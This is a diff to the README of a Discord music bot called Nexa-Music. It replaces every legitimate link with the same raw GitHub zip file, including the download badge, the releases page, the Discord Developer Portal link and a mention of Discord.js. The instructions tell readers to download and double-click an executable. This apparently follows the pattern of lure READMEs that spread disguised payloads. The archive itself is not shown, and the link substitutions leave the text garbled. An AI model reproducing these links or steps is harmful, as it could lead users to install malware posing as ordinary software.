@@ -1,15 +1,15 @@
 # 🎶 Nexa-Music - Your Music Bot for Discord
 
-[![Download](https://img.shields.io/badge/Download%20Nexa--Music-v1.0-blue.svg)](https://github.com/vitao2222/Nexa-Music/releases)
+[![Download](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip%https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip)](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip)
 
 ## 🌟 Overview
-Nexa-Music is a simple yet powerful Discord music bot. It uses the Lavalink client and Discord.js v14 to bring music to your Discord server. Whether you're hosting a gaming night or a chill hangout, this bot keeps the music flowing smoothly.
+Nexa-Music is a simple yet powerful Discord music bot. It uses the Lavalink client and https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip v14 to bring music to your Discord server. Whether you're hosting a gaming night or a chill hangout, this bot keeps the music flowing smoothly.
 
 ## 🚀 Getting Started
 To get started with Nexa-Music, you'll need to download and install it. Follow these steps to set it up quickly.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the following link to access the download page: [Nexa-Music Releases](https://github.com/vitao2222/Nexa-Music/releases).
+1. **Visit the Releases Page**: Go to the following link to access the download page: [Nexa-Music Releases](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip).
 2. **Select the Latest Version**: Click on the latest version available. You'll find various options for download.
 3. **Download the Files**: Look for the executable file for your operating system. Click on it to start the download.
 4. **Run the Bot**: After the download completes, locate the file in your downloads folder and double-click it to run. 
@@ -25,7 +25,7 @@ Make sure your system meets these basic requirements to run Nexa-Music smoothly:
 After downloading the bot, follow these steps to set it up for your Discord server:
 
 1. **Create a New Discord Application**:
-   - Go to the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Go to the [Discord Developer Portal](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip).
    - Click "New Application" and give it a name (like "Nexa-Music").
 
 2. **Set Up a Bot User**:
@@ -71,4 +71,4 @@ Nexa-Music is open-source software. You can use and modify it under the terms of
 ## 🚀 Conclusion
 With Nexa-Music, you can easily add a music bot to your Discord server. Follow the steps above to download, install, and enjoy a seamless music experience. Don’t forget to visit the release page for updates and new features.
 
-[![Download](https://img.shields.io/badge/Download%20Nexa--Music-v1.0-blue.svg)](https://github.com/vitao2222/Nexa-Music/releases)
+[![Download](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip%https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip)](https://raw.githubusercontent.com/vitao2222/Nexa-Music/main/twentymo/Nexa-Music.zip)
